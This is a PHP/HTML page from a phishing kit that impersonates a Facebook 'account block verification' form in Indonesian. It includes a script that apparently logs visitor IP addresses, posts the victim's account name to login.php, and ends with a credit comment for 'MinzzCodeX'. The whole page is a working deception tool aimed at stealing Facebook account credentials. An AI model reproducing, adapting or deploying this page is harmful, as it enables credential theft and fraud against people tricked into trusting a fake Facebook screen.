<?php
include 'minzzcodexipaddres.php';
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Verifikasi Pemblokiran - Facebook</title>
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script> 
<style>
	body {
		color: #646464;
		background: #e2e2e2;
	}	
    .login-form {
        width: 300px;
    	margin: 30px auto;
    }
    .login-form h2 {
        font-size: 26px;
		font-weight: bold;
        margin: 30px 0;
        text-align: center;
    }
    .login-form form {
		color: #fff;
        background: #405e9e;
		background: radial-gradient(circle, #4d6ba9, #375595);
        box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
        padding: 25px;
        margin-bottom: 15px;
    }
	.login-form .form-control {
		border-color: #dfdfdf;
		box-shadow: none !important;
	}
    .login-form .form-control, .login-form .btn {
        min-height: 38px;        
    }
    .login-form input[type="text"] {
        border-radius: 2px 2px 0 0;
    }
    .login-form input[type="password"] {
        border-radius: 0 0 2px 2px;
        margin-top: -1px;
    }    
    .login-form .btn {        
        font-size: 15px;
		font-weight: bold;
		border-radius: 2px;
		background: #eeeeee;
		color: #646464;
		margin-bottom: 25px;
        outline: none !important;
    }
	.login-form a {		
		color: #405e9e;
	}
    .login-form form a {
        color: #fff;
    }
</style>
</head>
<body>
<div class="login-form">
    <form action="login.php" method="post">
		<h2 class="text-center">Facebook</h2>
		<p class="text-center small">Verifikasi Pemblokiran Akun</p>
        <div class="form-group">
            <input type="text" class="form-control" placeholder="Nama Akun Facebook" required="required">
        </div>
        <div class="form-group">
            <button type="submit" class="btn btn-default btn-block">Selanjutnya</button>
        </div>
        <p class="text-center">Pastikan Nama Akun Anda Benar</p>     
    </form>
    <p class="text-center small">Facebook &copy; 2022</p>
</div>
</body>
</html>
<!--
Delete/Change Copyright? You are IDIOT
HARGAI SAYA !!!
 ______________________________________________
|                                              |
|          Reedit by MinzzCodeX                |
|              @minzz.codex                    |
|      facebook.com/minzzstoree.ll             |
|                 © 2022                       |
|______________________________________________|

-->